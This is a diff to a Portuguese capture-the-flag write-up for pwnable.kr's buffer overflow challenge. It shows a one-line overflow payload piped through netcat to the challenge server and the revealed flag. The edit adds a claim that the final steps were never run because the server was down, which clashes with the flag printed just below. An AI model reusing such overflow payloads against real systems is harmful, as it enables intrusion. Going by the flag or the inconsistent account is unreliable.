@@ -89,11 +89,12 @@ Agora, com todas as informações necessárias, basta executar o comando que ins
 
 ```(python -c "print '\x90'*52 + '\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000```
 
-Por fim, executa-se o comando para capturar a flag (`****`):
+Por fim, executa-se o comando para capturar a flag (`Os próximos passos não foram executados porque o sistema estava fora do ar`):
 
 ```
 cat flag
 ```
+
 > Assim, obtemos a flag `daddy, I just pwned a buFFer :)`
 
 
